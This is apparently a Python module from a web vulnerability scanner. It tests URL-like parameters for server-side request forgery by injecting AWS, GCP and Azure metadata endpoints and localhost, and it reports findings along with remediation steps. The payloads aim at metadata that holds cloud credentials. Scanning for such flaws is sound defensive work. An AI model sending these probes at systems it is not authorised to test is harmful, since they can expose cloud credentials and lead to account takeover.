"""BurpNext Active Scanner — Server-Side Request Forgery"""
import aiohttp, urllib.parse, logging
from typing import List
logger = logging.getLogger("burpnext.ssrf")

URL_PARAMS = ["url","uri","src","dest","redirect","callback","fetch","proxy",
              "href","link","target","path","endpoint","service","remote","source"]
SSRF_TESTS = [
    ("http://169.254.169.254/latest/meta-data/",
     ["ami-id","instance-id","iam","security-credentials","local-ipv4"],
     "AWS Metadata"),
    ("http://metadata.google.internal/computeMetadata/v1/",
     ["computeMetadata","project-id","service-accounts"],
     "GCP Metadata"),
    ("http://169.254.169.254/metadata/instance",
     ["compute","network","subscriptionId"],
     "Azure Metadata"),
    ("http://127.0.0.1/",
     [],
     "Localhost SSRF"),
]

async def test(session, url: str, params: List[str], method: str="GET") -> List[dict]:
    findings = []
    ssrf_params = [p for p in params if any(k in p.lower() for k in URL_PARAMS)]
    for param in ssrf_params[:2]:
        for ssrf_url, indicators, label in SSRF_TESTS:
            try:
                to = aiohttp.ClientTimeout(total=8)
                test_url = f"{url}?{param}={urllib.parse.quote(ssrf_url)}"
                async with session.get(test_url, ssl=False, allow_redirects=True, timeout=to) as r:
                    body = (await r.content.read(8192)).decode("utf-8","ignore")
                    if indicators and any(ind in body for ind in indicators):
                        findings.append({
                            "title": f"SSRF — {label} Accessible via '{param}'",
                            "severity": "Critical", "cvss": 9.8, "confidence": "High",
                            "cwe": "CWE-918", "owasp": "A10:2021",
                            "url": url, "method": method, "parameter": param,
                            "payload": ssrf_url, "evidence": body[:400],
                            "description": f"SSRF confirmed — {label} reachable via '{param}' parameter.",
                            "why": f"{label} returns IAM/service credentials → full cloud account takeover. Attacker pivots to all internal services.",
                            "business_impact": "Complete cloud infrastructure compromise. Access to all internal services, databases, and credentials.",
                            "remediation": "Block cloud metadata endpoints. Implement strict URL allowlisting.",
                            "steps": [
                                "AWS: Enable IMDSv2 (requires session token, blocks simple SSRF)",
                                "Block 169.254.169.254 and metadata.google.internal at WAF/firewall",
                                "Implement URL allowlist — only permit explicitly approved domains",
                                "Use DNS rebinding protection — validate IP after DNS resolution",
                                "Never use user-supplied URLs to make server-side requests",
                            ],
                            "request_raw": f"GET {test_url} HTTP/1.1",
                        })
                        return findings
            except Exception as e:
                logger.debug(f"[SSRF] {param}/{label}: {e}")
    return findings
